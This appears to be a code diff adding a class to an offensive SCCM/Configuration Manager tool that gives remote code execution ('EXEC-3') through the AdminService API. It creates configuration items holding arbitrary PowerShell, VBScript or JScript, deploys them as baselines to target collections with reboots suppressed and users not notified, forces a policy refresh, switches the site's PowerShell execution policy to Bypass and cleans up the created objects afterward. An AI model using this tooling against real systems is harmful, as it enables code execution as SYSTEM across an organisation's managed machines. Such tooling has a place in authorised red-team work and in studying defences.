@@ -1696,6 +1696,787 @@ UserPrincipalName: {tb['UserPrincipalName'].to_string(index=False, header=False)
                 print(e)  
 
 
+# Creating schedule tokens is annoying AF. Period. Then, SMS_ScheduleMethods.WriteToString is not routable via AdminService
+# so here are some hardcoded values instead. If you want something different, here's the documentation:
+# https://learn.microsoft.com/en-us/mem/configmgr/develop/reference/core/servers/configure/sms_scheduletoken-server-wmi-class
+# https://learn.microsoft.com/en-us/intune/configmgr/develop/core/understand/about-configuration-manager-schedules
+# https://learn.microsoft.com/en-us/intune/configmgr/develop/core/understand/how-to-create-a-schedule-token
+# https://learn.microsoft.com/en-us/mem/configmgr/develop/reference/core/servers/configure/sms_schedulemethods-server-wmi-class
+# https://learn.microsoft.com/en-us/powershell/module/configurationmanager/convert-cmschedule?view=sccm-ps
+BASELINE_SCHEDULE_TOKENS = {
+    15: "000120000011E000",
+    30: "00012000001E2000",
+    60: "00012000003C4000",
+    120: "000120000078A000",
+    240: "0001200000F0E000",
+    480: "0001200001E0E000",
+    1440: "000520000012C000",
+}
+
+
+class SMSBASELINE(AdminServiceClient):
+    """EXEC-3: Configuration Baseline code execution via AdminService."""
+
+    def __init__(self, username, password, target, kerberos, domain, kdcHost, logs_dir):
+        super().__init__(username, password, target, kerberos, domain, kdcHost, logs_dir)
+        self.site_ID = ""
+        self.scope_ID = ""
+        self.site_code = ""
+        self.ci_id = ""
+        self.ci_guid = ""
+        self.bl_ci_id = ""
+        self.bl_guid = ""
+        self.assignment_id = ""
+        self.collection_id = ""
+        self.collection_name = ""
+        self.collection_type = ""
+        self.target_resource = ""
+        self.class_name = ""
+        self.ci_name = ""
+        self.bl_name = ""
+
+    # Here we call the GetSiteID method of SMS_Identitification class to return the site ID, then strip the {}
+    # Build the scopeID by prepending "ScopeId_" to the site ID. This is required for building the CI XML later
+    #   since the AuthoringScopeId attribute needs to be set to the scope ID of the site.
+    def get_siteid(self):
+        url = f"https://{self.target}/AdminService/wmi/SMS_Identification.GetSiteID"
+        try:
+            r = self.http_get(url)
+            if r.status_code == 201:
+                result = r.json()
+                site_ID = result.get("SiteID", "")
+                self.site_ID = site_ID.replace("{", "").replace("}", "")
+                self.scope_ID = f"ScopeId_{self.site_ID}"
+                logger.info(f"[+] ScopeId: {self.scope_ID}")
+            else:
+                logger.info("[-] Something went wrong when requesting the site ID.")
+                logger.info(r.status_code)
+                return False
+        except Exception as e:
+            logger.info(e)
+            return False
+        return True
+
+    # Query the site code from the SMS_Identification class
+    # If that fails, fallback to querying the SMS_Site class
+    # The site code is needed for building the CI XML later since the CI logical name needs to be in the format "OperatingSystem_{site_code}_{ci_guid}"
+    def get_sitecode(self):
+        url = f"https://{self.target}/AdminService/wmi/SMS_Identification"
+        r = self.http_get(url)
+        if r.status_code == 200:
+            response = r.json()
+            values = response.get("value", [])
+            if values:
+                self.site_code = values[0].get("ThisSiteCode", "")
+        if not self.site_code:
+            # Fallback to SMS_Site
+            url2 = f"https://{self.target}/AdminService/wmi/SMS_Site"
+            r2 = self.http_get(url2)
+            if r2.status_code == 200:
+                self.site_code = r2.json()["value"][0]["SiteCode"]
+
+    # Here we're building the DesiredConfigurationDigest XML (it's gross), which defines the configuration item.
+    # We specify a discovery script that we want to run on the target. Optionally, we can also run a remediation script.
+    # We default to a compliant return value of 1 if a remediation script is provided, and 0 if not
+    # This is because the rule in the XML is set to return non-compliant if the discovery script returns 0,
+    # so if we want the remediation script to run, we need to return non-compliant (1) from the discovery script when the
+    # configuration is not in the desired state.
+    def _build_ci_xml(self, discovery_script, remediation_script=None,
+                      language="PowerShell", context="System"):
+        use_remediation = remediation_script is not None
+        compliant_value = 1 if use_remediation else 0
+
+        if language == "PowerShell":
+            wrapped_discovery = f"try {{\n    {discovery_script}\n}} catch {{}}\nreturn {compliant_value}"
+            wrapped_remediation = f"try {{\n    {remediation_script}\n}} catch {{}}" if use_remediation else None
+        elif language == "VBScript":
+            wrapped_discovery = f"On Error Resume Next\n{discovery_script}\nWscript.Echo {compliant_value}"
+            wrapped_remediation = f"On Error Resume Next\n{remediation_script}" if use_remediation else None
+        elif language == "JScript":
+            wrapped_discovery = f"try {{\n    {discovery_script}\n}} catch(e) {{}}\nWScript.Echo({compliant_value});"
+            wrapped_remediation = f"try {{\n    {remediation_script}\n}} catch(e) {{}}" if use_remediation else None
+
+        import xml.sax.saxutils
+        escaped_discovery = xml.sax.saxutils.escape(wrapped_discovery)
+
+        remediation_line = ""
+        if use_remediation:
+            escaped_remediation = xml.sax.saxutils.escape(wrapped_remediation)
+            remediation_line = f'\n            <RemediationScriptBody ScriptType="{language}">{escaped_remediation}</RemediationScriptBody>'
+
+        is_per_user_attr = ' IsPerUser="true"' if context == "User" else ""
+        changeable = "true" if use_remediation else "false"
+
+        res1 = f"ID-{uuid.uuid4()}"
+        res2 = f"ID-{uuid.uuid4()}"
+        res3 = f"ID-{uuid.uuid4()}"
+
+        #
+        return f'''<?xml version="1.0" encoding="utf-16"?>
+<DesiredConfigurationDigest xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration">
+  <!--Authored against the following schema version: 5-->
+  <OperatingSystem AuthoringScopeId="{self.scope_ID}" LogicalName="OperatingSystem_{self.ci_guid}" Version="1">
+    <Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
+      <DisplayName Text="{self.ci_name}" ResourceId="{res1}"/>
+      <Description Text=""/>
+    </Annotation>
+    <Parts><SuppressionReferences/></Parts>
+    <Settings>
+      <RootComplexSetting>
+        <SimpleSetting LogicalName="ScriptSetting_{self.ci_guid}" DataType="Int64">
+          <Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
+            <DisplayName Text="Setting-{self.ci_name}" ResourceId="{res2}"/>
+            <Description Text=""/>
+          </Annotation>
+          <ScriptDiscoverySource Is64Bit="true"{is_per_user_attr}>
+            <DiscoveryScriptBody ScriptType="{language}">{escaped_discovery}</DiscoveryScriptBody>{remediation_line}
+          </ScriptDiscoverySource>
+        </SimpleSetting>
+      </RootComplexSetting>
+    </Settings>
+    <Rules>
+      <Rule xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"
+            id="Rule_{uuid.uuid4()}" Severity="None" NonCompliantWhenSettingIsNotFound="false">
+        <Annotation>
+          <DisplayName Text="Rule-{self.ci_name}" ResourceId="{res3}"/>
+          <Description Text=""/>
+        </Annotation>
+        <Expression>
+          <Operator>Equals</Operator>
+          <Operands>
+            <SettingReference AuthoringScopeId="{self.scope_ID}"
+              LogicalName="OperatingSystem_{self.ci_guid}" Version="1"
+              DataType="Int64" SettingLogicalName="ScriptSetting_{self.ci_guid}"
+              SettingSourceType="Script" Method="Value" Changeable="{changeable}"/>
+            <ConstantValue Value="0" DataType="Int64"/>
+          </Operands>
+        </Expression>
+      </Rule>
+    </Rules>
+    <OperatingSystemDiscoveryRule xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
+      <OperatingSystemExpression>
+        <Operator>OneOf</Operator>
+        <Operands>
+          <RuleExpression RuleId="Windows/All_Windows_Client_Server"/>
+        </Operands>
+      </OperatingSystemExpression>
+    </OperatingSystemDiscoveryRule>
+  </OperatingSystem>
+</DesiredConfigurationDigest>'''
+
+    # Build the configuration baseline XML, which follows the same DesiredConfigurationDigest schema.
+    # The root element differs here (Baseline instead of OperatingSystem), and the baseline references the CI in the OperatingSystems section.
+    def _build_baseline_xml(self):
+        res = f"ID-{uuid.uuid4()}"
+        return f'''<?xml version="1.0" encoding="utf-16"?>
+<DesiredConfigurationDigest xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration">
+  <!--Authored against the following schema version: 5-->
+  <Baseline AuthoringScopeId="{self.scope_ID}" LogicalName="Baseline_{self.bl_guid}" Version="1">
+    <Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
+      <DisplayName Text="{self.bl_name}" ResourceId="{res}"/>
+      <Description Text=""/>
+    </Annotation>
+    <RequiredItems/>
+    <ProhibitedItems/>
+    <OptionalItems/>
+    <OperatingSystems>
+      <OperatingSystemReference AuthoringScopeId="{self.scope_ID}"
+        LogicalName="OperatingSystem_{self.ci_guid}" Version="1"/>
+    </OperatingSystems>
+    <SoftwareUpdates/>
+    <Baselines/>
+    <OtherConfigurationItems/>
+  </Baseline>
+</DesiredConfigurationDigest>'''
+
+    # POST to SMS_ConfigurationItem with the CI XML to create the configuration item
+    # We set the CIType_ID to 3 for configuration items, and 2 for baselines.
+    # Store the CI_ID in self.ci_id for later use when creating the baseline and assignment
+    def add_ci(self, discovery_script, remediation_script=None,
+               language="PowerShell", context="System"):
+        ci_xml = self._build_ci_xml(discovery_script, remediation_script, language, context)
+        url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem"
+        body = {
+            "SDMPackageXML": ci_xml,
+            "IsHidden": False,
+            "CIType_ID": 3,
+        }
+        logger.info(f"[*] Creating Configuration Item: {self.ci_name}")
+        r = self.http_post(url, json_data=body)
+        if r.status_code == 201:
+            response = r.json()
+            self.ci_id = response.get("CI_ID")
+            logger.info(f"[+] Created CI with CI_ID: {self.ci_id}")
+            return True
+        else:
+            logger.info(f"[-] Failed to create CI: {r.status_code}")
+            logger.info(r.text)
+            return False
+
+    # POST to SMS_ConfigurationItem with the baseline XML and CIType_ID = 2 to create the configuration baseline
+    def add_baseline(self):
+        bl_xml = self._build_baseline_xml()
+        url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem"
+        body = {
+            "SDMPackageXML": bl_xml,
+            "IsHidden": False,
+            "CIType_ID": 2,
+        }
+        logger.info(f"[*] Creating Baseline: {self.bl_name}")
+        r = self.http_post(url, json_data=body)
+        if r.status_code == 201:
+            response = r.json()
+            self.bl_ci_id = response.get("CI_ID")
+            logger.info(f"[+] Created Baseline with CI_ID: {self.bl_ci_id}")
+            return True
+        else:
+            logger.info(f"[-] Failed to create baseline: {r.status_code}")
+            logger.info(r.text)
+            return False
+
+    # This is the deployment step. The assignment tells SCCM to evaluate this baseline against the collection on this schedule.
+    def add_assignment(self, schedule_minutes=15, remediate=False):
+        schedule_token = BASELINE_SCHEDULE_TOKENS.get(schedule_minutes, BASELINE_SCHEDULE_TOKENS[15])
+        now = datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
+
+        body = {
+            "AssignedCIs": [int(self.bl_ci_id)],                # CIs to deploy
+            "AssignmentAction": 2,                              # 2 = Evaluate
+            "AssignmentName": f"{self.bl_name}_Assignment",
+            "AssignmentDescription": "",
+            "DesiredConfigType": 1,                             # 1 = Required, targets must evaluate
+            "DPLocality": 4,
+            "EvaluationSchedule": schedule_token,               # Schedule token for how often to evaluate the baseline
+            "LogComplianceToWinEvent": True,                    # logs to Windows Event Log
+            "NotifyUser": False,
+            "SendDetailedNonComplianceStatus": False,
+            "StartTime": now,
+            "SuppressReboot": 3,                                # 3 = Suppress all reboots
+            "TargetCollectionID": self.collection_id,
+            "UseGMTTimes": True,
+            "OverrideServiceWindows": True,
+            "Enabled": True,
+            "ApplyToSubTargets": False,
+        }
+        if remediate:
+            body["EnforcementEnabled"] = True
+
+        logger.info(f"[*] Creating Baseline Assignment -> {self.collection_id}")
+        url = f"https://{self.target}/AdminService/wmi/SMS_BaselineAssignment"
+        r = self.http_post(url, json_data=body)
+        if r.status_code == 201:
+            response = r.json()
+            self.assignment_id = response.get("AssignmentID")
+            logger.info(f"[+] Created Assignment with ID: {self.assignment_id}")
+            logger.info(f"[*] Schedule: every {schedule_minutes} min ({schedule_token})")
+            return True
+        else:
+            logger.info(f"[-] Failed to create assignment: {r.status_code}")
+            logger.info(r.text)
+            return False
+
+    # Tell the client to force a policy update, which should make it download the new baseline assignment
+    # Evaluation will occur on the client based on the schedule token
+    def force_policy_update(self):
+        url = f"https://{self.target}/AdminService/wmi/SMS_ClientOperation.InitiateClientOperation"
+        logger.info(f"[*] Forcing policy download on {self.collection_id}")
+        body = {
+            "Type": 8,
+            "TargetCollectionID": self.collection_id,
+        }
+        r = self.http_post(url, json_data=body)
+        if r.status_code == 201:
+            logger.info("[+] Policy refresh initiated")
+            return True
+        else:
+            logger.info(f"[-] Failed to force policy: {r.status_code}")
+            return False
+
+    # Delete the objects we created in reverse order (assignment -> baseline -> CI)
+    def cleanup(self):
+        logger.info("[*] Cleaning up baseline deployment")
+
+        if self.assignment_id:
+            url = f"https://{self.target}/AdminService/wmi/SMS_BaselineAssignment({self.assignment_id})"
+            r = self.http_delete(url)
+            if r.status_code == 204:
+                logger.info(f"[+] Deleted assignment {self.assignment_id}")
+            else:
+                logger.info(f"[-] Failed to delete assignment: {r.status_code}")
+
+        if self.bl_ci_id:
+            url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem({self.bl_ci_id})"
+            r = self.http_delete(url)
+            if r.status_code == 204:
+                logger.info(f"[+] Deleted baseline CI_ID {self.bl_ci_id}")
+            else:
+                logger.info(f"[-] Failed to delete baseline: {r.status_code}")
+
+        if self.ci_id:
+            url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem({self.ci_id})"
+            r = self.http_delete(url)
+            if r.status_code == 204:
+                logger.info(f"[+] Deleted CI CI_ID {self.ci_id}")
+            else:
+                logger.info(f"[-] Failed to delete CI: {r.status_code}")
+
+        logger.info("[+] Cleanup complete")
+
+    # Explicitly cleanup by ID (E.g., you created something in a previous session and forgot to clean up)
+    def cleanup_by_ids(self, assignment_id=None, baseline_id=None, ci_id=None):
+        if not assignment_id and not baseline_id and not ci_id:
+            logger.info("[-] At least one ID is required (--assignment-id, --baseline-id, --ci-id)")
+            return
+        if assignment_id:
+            self.delete_assignment(assignment_id)
+        if baseline_id:
+            self.delete_baseline(baseline_id)
+        if ci_id:
+            self.delete_ci(ci_id)
+        logger.info("[+] Cleanup complete")
+
+    # Create a collection and add the target resource to it. This flow is invoked when baseline exec -t is used
+    # 
+    def validate_resource_id(self):
+        if self.collection_type == "user":
+            class_name = "SMS_R_User"
+            url = f"https://{self.target}/AdminService/wmi/SMS_R_User({self.target_resource})"
+        else:
+            class_name = "SMS_R_System"
+            url = f"https://{self.target}/AdminService/wmi/SMS_R_System({self.target_resource})"
+
+        r = self.http_get(url)
+        if r.status_code == 200:
+            self.class_name = class_name
+            return True
+        elif r.status_code == 404:
+            logger.info(f"[-] Resource with ResourceID {self.target_resource} not found.")
+            return False
+
+    def add_collection(self):
+        if self.collection_type == "device":
+            collection_type = 2
+            limit_collection = "SMS00001"
+        else:
+            collection_type = 1
+            limit_collection = "SMS00002"
+
+        self.collection_name = f"{self.collection_type}_{uuid.uuid4()}"
+        logger.info(f"[*] Creating new {self.collection_type} collection: {self.collection_name}")
+
+        url = f"https://{self.target}/AdminService/wmi/SMS_Collection"
+        body = {
+            "Name": self.collection_name,
+            "LimitToCollectionID": limit_collection,
+            "Comment": "",
+            "CollectionType": collection_type
+        }
+
+        r = self.http_post(url, json_data=body)
+        if r.status_code == 201:
+            logger.info("[+] Successfully created collection")
+            response = r.json()
+            self.collection_id = response.get("CollectionID")
+            return True
+        else:
+            logger.info(f"[-] Failed to create collection: {r.status_code}")
+            logger.info(r.text)
+            return False
+
+    def add_collection_member(self):
+        url = f"https://{self.target}/AdminService/wmi/SMS_Collection('{self.collection_id}')/AdminService.AddMembershipRule"
+        body = {
+            "collectionRule": {
+                "@odata.type": "#AdminService.SMS_CollectionRuleDirect",
+                "ResourceClassName": self.class_name,
+                "RuleName": f"{self.collection_type}_{uuid.uuid4()}",
+                "ResourceID": int(self.target_resource)
+            }
+        }
+        r = self.http_post(url, json_data=body)
+        if r.status_code == 201:
+            logger.info(f"[+] Added resource {self.target_resource} to {self.collection_name}")
+            return True
+        else:
+            logger.info(f"[-] Failed to add collection member: {r.status_code}")
+            logger.info(r.text)
+            return False
+
+    def validated_collection_membership(self):
+        logger.info("[*] Waiting for new collection member to become available")
+        time.sleep(5)
+        url = f"https://{self.target}/AdminService/wmi/SMS_FullCollectionMembership?$filter=CollectionID eq '{self.collection_id}'"
+        while True:
+            r = self.http_get(url)
+            if r.status_code == 200:
+                response = r.json()
+                if len(response.get('value', [])) > 0:
+                    logger.info(f"[+] Successfully added resource {self.target_resource} to {self.collection_name}")
+                    return True
+            logger.info("[*] New collection member is not available yet... trying again in 5 seconds")
+            time.sleep(5)
+
+    def new_collection(self):
+        if not self.validate_resource_id():
+            return False
+        if not self.add_collection():
+            return False
+        if not self.add_collection_member():
+            return False
+        if not self.validated_collection_membership():
+            return False
+        return True
+
+    # Methods for listing existing baselines, assignments, and configuration items. Useful for cleanup and recon
+    def list_all(self):
+        self.list_assignments()
+        self.list_configuration_baselines()
+        self.list_configuration_items()
+
+    def list_assignments(self):
+        logger.info("[*] Listing all baseline assignments")
+        url = f"https://{self.target}/AdminService/wmi/SMS_BaselineAssignment?$select=AssignmentID,AssignmentName,AssignedCIs,TargetCollectionID,Enabled,CreationTime"
+        r = self.http_get(url)
+        if r.status_code != 200:
+            logger.info(f"[-] Failed to query assignments: {r.status_code}")
+            return
+
+        assignments = r.json().get("value", [])
+        if not assignments:
+            logger.info("[*] No assignments found.")
+            return
+
+        results = []
+        for a in assignments:
+            row = {
+                "AssignmentID": a["AssignmentID"],
+                "Name": a["AssignmentName"],
+                "Collection": a["TargetCollectionID"],
+                "Enabled": a["Enabled"],
+                "Created": a.get("CreationTime", "N/A"),
+            }
+            for ci_id in a.get("AssignedCIs", []):
+                bl_url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem({ci_id})?$select=CI_ID,LocalizedDisplayName"
+                r2 = self.http_get(bl_url)
+                if r2.status_code == 200:
+                    ci_data = r2.json()
+                    if "value" in ci_data:
+                        ci_data = ci_data["value"][0] if ci_data["value"] else {}
+                    row["BaselineName"] = ci_data.get("LocalizedDisplayName", "N/A")
+                    row["BaselineCIID"] = ci_data.get("CI_ID", "N/A")
+            results.append(row)
+
+        headers = ["AssignmentID", "Name", "Collection", "Enabled", "BaselineName", "BaselineCIID", "Created"]
+        table_data = [[r.get(h, "") for h in headers] for r in results]
+        logger.info("\n" + tabulate(table_data, headers=headers, tablefmt="grid"))
+
+    def list_configuration_baselines(self):
+        logger.info("[*] Listing all configuration baselines (CIType_ID=2)")
+        url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem?$filter=CIType_ID eq 2&$select=CI_ID,CI_UniqueID,LocalizedDisplayName,DateCreated,IsEnabled"
+        r = self.http_get(url)
+        if r.status_code != 200:
+            logger.info(f"[-] Failed to query baselines: {r.status_code}")
+            return
+
+        items = r.json().get("value", [])
+        if not items:
+            logger.info("[*] No baselines found.")
+            return
+
+        headers = ["CI_ID", "Name", "CI_UniqueID", "Enabled", "Created"]
+        table_data = [
+            [i["CI_ID"], i.get("LocalizedDisplayName", "N/A"), i.get("CI_UniqueID", ""), i.get("IsEnabled", ""), i.get("DateCreated", "")]
+            for i in items
+        ]
+        logger.info("\n" + tabulate(table_data, headers=headers, tablefmt="grid"))
+
+    def list_configuration_items(self):
+        logger.info("[*] Listing all configuration items (CIType_ID=3)")
+        url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem?$filter=CIType_ID eq 3&$select=CI_ID,CI_UniqueID,LocalizedDisplayName,DateCreated,IsEnabled"
+        r = self.http_get(url)
+        if r.status_code != 200:
+            logger.info(f"[-] Failed to query CIs: {r.status_code}")
+            return
+
+        items = r.json().get("value", [])
+        if not items:
+            logger.info("[*] No configuration items found.")
+            return
+
+        headers = ["CI_ID", "Name", "CI_UniqueID", "Enabled", "Created"]
+        table_data = [
+            [i["CI_ID"], i.get("LocalizedDisplayName", "N/A"), i.get("CI_UniqueID", ""), i.get("IsEnabled", ""), i.get("DateCreated", "")]
+            for i in items
+        ]
+        logger.info("\n" + tabulate(table_data, headers=headers, tablefmt="grid"))
+
+    # Individual cleanup methods by ID, in case you want to delete specific objects without cleaning up everything
+    def delete_assignment(self, assignment_id):
+        logger.info(f"[*] Deleting assignment {assignment_id}")
+        url = f"https://{self.target}/AdminService/wmi/SMS_BaselineAssignment({assignment_id})"
+        r = self.http_delete(url)
+        if r.status_code == 204:
+            logger.info(f"[+] Deleted assignment {assignment_id}")
+        else:
+            logger.info(f"[-] Failed to delete assignment: {r.status_code}")
+
+    def delete_baseline(self, baseline_id):
+        logger.info(f"[*] Deleting baseline CI_ID {baseline_id}")
+        url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem({baseline_id})"
+        r = self.http_delete(url)
+        if r.status_code == 204:
+            logger.info(f"[+] Deleted baseline CI_ID {baseline_id}")
+        else:
+            logger.info(f"[-] Failed to delete baseline: {r.status_code}")
+
+    def delete_ci(self, ci_id):
+        logger.info(f"[*] Deleting CI CI_ID {ci_id}")
+        url = f"https://{self.target}/AdminService/wmi/SMS_ConfigurationItem({ci_id})"
+        r = self.http_delete(url)
+        if r.status_code == 204:
+            logger.info(f"[+] Deleted CI CI_ID {ci_id}")
+        else:
+            logger.info(f"[-] Failed to delete CI: {r.status_code}")
+
+    # SCCM sets its clients' PowerShell execution policy via client settings, which are defined in the SMS_SCI_ClientComp class
+    # There are multiple client components that can set this value, and they apply in a specific order based on their priority (user policies override device policies, and custom policies override default policies).
+    def get_execution_policy(self):
+        """Read the current PowerShell execution policy from site control client component settings."""
+        logger.info("[*] Checking current PowerShell execution policy")
+
+        # Get site code first
+        if not self.site_code:
+            self.get_sitecode()
+        if not self.site_code:
+            logger.info("[-] Could not determine site code")
+            return None
+
+        # Query all SMS_SCI_ClientComp entries for this site and find the one with PowerShellExecutionPolicy
+        url = f"https://{self.target}/AdminService/wmi/SMS_SCI_ClientComp?$filter=SiteCode eq '{self.site_code}'"
+        r = self.http_get(url)
+        if r.status_code != 200:
+            logger.info(f"[-] Failed to query client component settings: {r.status_code}")
+            return None
+
+        items = r.json().get("value", [])
+        if not items:
+            logger.info("[-] No client component settings found for this site")
+            return None
+
+        policy_map = {0: "AllSigned", 1: "Bypass", 2: "Restricted"}
+
+        # Search all components for PowerShellExecutionPolicy
+        for item in items:
+            props = item.get("Props", [])
+            for prop in props:
+                if prop.get("PropertyName") == "PowerShellExecutionPolicy":
+                    val = prop.get("Value", -1)
+                    component = item.get("ClientComponentName", item.get("ItemName", "Unknown"))
+                    policy_name = policy_map.get(val, f"Unknown({val})")
+                    logger.info(f"[+] Current PowerShell Execution Policy: {policy_name} ({val})")
+                    logger.info(f"[*] Found in component: {component}")
+                    return val
+
+        # List available components for debugging
+        component_names = [i.get("ClientComponentName", i.get("ItemName", "?")) for i in items]
+        logger.info(f"[*] PowerShellExecutionPolicy not found in any component")
+        logger.info(f"[*] Available components: {', '.join(component_names)}")
+        return None
+
+    def _get_client_agent_component(self):
+        """Fetch the Client Agent SMS_SCI_ClientComp entry and return (item, props_index, current_value)."""
+        if not self.site_code:
+            self.get_sitecode()
+        if not self.site_code:
+            logger.info("[-] Could not determine site code")
+            return None, None, None
+
+        url = f"https://{self.target}/AdminService/wmi/SMS_SCI_ClientComp?$filter=SiteCode eq '{self.site_code}'"
+        r = self.http_get(url)
+        if r.status_code != 200:
+            logger.info(f"[-] Failed to query client component settings: {r.status_code}")
+            return None, None, None
+
+        items = r.json().get("value", [])
+        for item in items:
+            props = item.get("Props", [])
+            for idx, prop in enumerate(props):
+                if prop.get("PropertyName") == "PowerShellExecutionPolicy":
+                    return item, idx, prop.get("Value", -1)
+
+        logger.info("[-] PowerShellExecutionPolicy not found in any component")
+        return None, None, None
+
+    def set_execution_policy_bypass(self):
+        """Modify the default client settings to set PowerShell execution policy to Bypass via SMS_SCI_ClientComp."""
+        logger.info("[*] Setting PowerShell ExecutionPolicy to Bypass in default client settings")
+
+        item, prop_idx, current_val = self._get_client_agent_component()
+        if item is None:
+            return False
+
+        policy_map = {0: "AllSigned", 1: "Bypass", 2: "Restricted"}
+        logger.info(f"[*] Current value: {policy_map.get(current_val, current_val)} ({current_val})")
+
+        if current_val == 1:
+            logger.info("[+] Already set to Bypass, nothing to do")
+            return True
+
+        # Modify the prop value in the full object
+        item["Props"][prop_idx]["Value"] = 1
+
+        # Build the composite key for PUT
+        file_type = item.get("FileType", 2)
+        item_name = item.get("ItemName", "")
+        item_type = item.get("ItemType", "")
+        site_code = item.get("SiteCode", self.site_code)
+
+        put_url = (f"https://{self.target}/AdminService/wmi/"
+                   f"SMS_SCI_ClientComp(FileType={file_type},ItemName='{item_name}',"
+                   f"ItemType='{item_type}',SiteCode='{site_code}')")
+
+        logger.info(f"[*] Updating component '{item.get('ClientComponentName', item_name)}'")
+        r = self.http_post(put_url, json_data=item)  # Try PUT-style via POST first
+        if r.status_code not in (200, 201, 204):
+            # Try actual PUT
+            r = self._make_request("PUT", put_url, json_data=item)
+            if r.status_code not in (200, 201, 204):
+                logger.info(f"[-] Failed to update component: {r.status_code}")
+                logger.info(r.text)
+                return False
+
+        logger.info(f"[+] PowerShell ExecutionPolicy changed from {policy_map.get(current_val, current_val)} to Bypass")
+        logger.info(f"[*] To restore: baseline set-execpolicy --restore {current_val}")
+        return True
+
+    def restore_execution_policy(self, value):
+        """Restore the PowerShell execution policy to a previous value."""
+        policy_map = {0: "AllSigned", 1: "Bypass", 2: "Restricted"}
+        logger.info(f"[*] Restoring PowerShell ExecutionPolicy to {policy_map.get(value, value)} ({value})")
+
+        item, prop_idx, current_val = self._get_client_agent_component()
+        if item is None:
+            return False
+
+        item["Props"][prop_idx]["Value"] = value
+
+        file_type = item.get("FileType", 2)
+        item_name = item.get("ItemName", "")
+        item_type = item.get("ItemType", "")
+        site_code = item.get("SiteCode", self.site_code)
+
+        put_url = (f"https://{self.target}/AdminService/wmi/"
+                   f"SMS_SCI_ClientComp(FileType={file_type},ItemName='{item_name}',"
+                   f"ItemType='{item_type}',SiteCode='{site_code}')")
+
+        r = self.http_post(put_url, json_data=item)
+        if r.status_code not in (200, 201, 204):
+            r = self._make_request("PUT", put_url, json_data=item)
+            if r.status_code not in (200, 201, 204):
+                logger.info(f"[-] Failed to restore: {r.status_code}")
+                logger.info(r.text)
+                return False
+
+        logger.info(f"[+] Restored PowerShell ExecutionPolicy to {policy_map.get(value, value)}")
+        return True
+
+    def delete_client_settings(self, settings_id):
+        """Delete a custom client settings policy."""
+        logger.info(f"[*] Deleting custom client settings (SettingsID: {settings_id})")
+        url = f"https://{self.target}/AdminService/wmi/SMS_ClientSettings({settings_id})"
+        r = self.http_delete(url)
+        if r.status_code == 204:
+            logger.info(f"[+] Deleted client settings {settings_id}")
+            return True
+        else:
+            logger.info(f"[-] Failed to delete client settings: {r.status_code}")
+            logger.info(r.text)
+            return False
+
+    def list_client_settings(self):
+        """List all custom client settings policies."""
+        logger.info("[*] Listing custom client settings")
+        url = f"https://{self.target}/AdminService/wmi/SMS_ClientSettings?$select=SettingsID,Name,Description,Priority,Enabled,DateCreated"
+        r = self.http_get(url)
+        if r.status_code != 200:
+            logger.info(f"[-] Failed to query client settings: {r.status_code}")
+            return
+
+        items = r.json().get("value", [])
+        if not items:
+            logger.info("[*] No custom client settings found.")
+            return
+
+        headers = ["SettingsID", "Name", "Priority", "Enabled", "Created"]
+        table_data = [
+            [i["SettingsID"], i.get("Name", "N/A"), i.get("Priority", ""), i.get("Enabled", ""), i.get("DateCreated", "")]
+            for i in items
+        ]
+        logger.info("\n" + tabulate(table_data, headers=headers, tablefmt="grid"))
+
+    def run(self, discovery_script, collection_id=None, target_resource=None,
+            collection_type="device", remediation_script=None,
+            language="PowerShell", context="System", schedule_minutes=15,
+            base_name=None, force=False):
+
+        if not collection_id and not target_resource:
+            logger.info("[-] Either --collection-id or --target is required")
+            return
+
+        if not base_name:
+            base_name = uuid.uuid4().hex[:8]
+
+        self.ci_name = f"CI-{base_name}"
+        self.bl_name = f"BL-{base_name}"
+        self.ci_guid = str(uuid.uuid4())
+        self.bl_guid = str(uuid.uuid4())
+        use_remediation = remediation_script is not None
+
+        # Handle collection: create new or use existing
+        if target_resource and not collection_id:
+            self.target_resource = target_resource
+            self.collection_type = collection_type
+            logger.info(f"[*] Creating new {collection_type} collection for resource {target_resource}")
+            if not self.new_collection():
+                return
+        else:
+            self.collection_id = collection_id
+
+        logger.info(f"[*] EXEC-3: Compliance Baseline Execution (AdminService)")
+        logger.info(f"[*] CI Name:     {self.ci_name}")
+        logger.info(f"[*] BL Name:     {self.bl_name}")
+        logger.info(f"[*] Collection:  {self.collection_id}")
+        logger.info(f"[*] Context:     {context}")
+        logger.info(f"[*] Language:    {language}")
+        logger.info(f"[*] Schedule:    Every {schedule_minutes} min")
+        logger.info(f"[*] Remediation: {use_remediation}")
+
+        if not self.get_siteid():
+            return
+
+        if not self.add_ci(discovery_script, remediation_script, language, context):
+            return
+
+        if not self.add_baseline():
+            logger.info("[!] Cleaning up CI after baseline failure")
+            self.ci_id and self.cleanup()
+            return
+
+        if not self.add_assignment(schedule_minutes, use_remediation):
+            logger.info("[!] Cleaning up after assignment failure")
+            self.cleanup()
+            return
+
+        if force:
+            self.force_policy_update()
+
+        logger.info(f"[+] Deployment complete")
+        logger.info(f"[*] Assignment ID: {self.assignment_id}")
+        logger.info(f"[*] Baseline CI_ID: {self.bl_ci_id}")
+        logger.info(f"[*] CI CI_ID: {self.ci_id}")
+        logger.info(f"[*] To cleanup: baseline cleanup --assignment-id {self.assignment_id} --baseline-id {self.bl_ci_id} --ci-id {self.ci_id}")
+
+
 class SMSSCRIPTS(AdminServiceClient):
 
     def __init__(self, username, password, target,  kerberos, domain, kdcHost, logs_dir, auser, apassword,  accache=None, ps_transform=None):
